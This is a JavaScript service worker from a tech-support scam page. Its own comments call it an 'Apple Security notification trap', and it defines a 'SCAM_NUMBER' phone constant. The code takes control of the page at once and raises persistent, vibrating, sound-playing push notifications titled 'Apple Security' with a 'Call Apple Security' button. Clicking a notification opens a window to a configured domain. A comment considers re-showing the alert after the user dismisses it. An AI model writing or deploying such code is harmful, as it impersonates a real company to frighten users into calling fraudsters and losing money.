// Service Worker for Apple Security notification trap
// Handles: showNotification, notificationclick, push events

var SCAM_NUMBER = '+1-877-370-7256';
var SCAM_DOMAIN = 'apple.com';

self.addEventListener('install', function(e) {
    self.skipWaiting();
});

self.addEventListener('activate', function(e) {
    e.waitUntil(self.clients.claim());
});

// Show notification when page calls registration.showNotification()
self.addEventListener('notificationclick', function(e) {
    e.notification.close();
    e.waitUntil(
        clients.matchAll({ type: 'window' }).then(function(clientList) {
            for (var i = 0; i < clientList.length; i++) {
                var client = clientList[i];
                if ('focus' in client) return client.focus();
            }
            if (clients.openWindow) {
                return clients.openWindow('https://' + SCAM_DOMAIN + '/support/?ref=sw');
            }
        })
    );
});

// Handle push events (for future server-pushed notifications)
self.addEventListener('push', function(e) {
    var data = e.data ? e.data.text() : 'Apple Security Alert';
    var options = {
        body: data,
        icon: '/icon-192.png',
        badge: '/icon-192.png',
        tag: 'apple-security-alert',
        requireInteraction: true,
        vibrate: [200, 100, 200, 100, 200],
        sound: '/ualert.mpeg',
        actions: [
            { action: 'call', title: 'Call Apple Security' },
            { action: 'dismiss', title: 'Dismiss' }
        ]
    };
    e.waitUntil(self.registration.showNotification('Apple Security', options));
});

// Handle notification action button clicks
self.addEventListener('notificationclose', function(e) {
    // Could re-show notification here if user dismisses
});
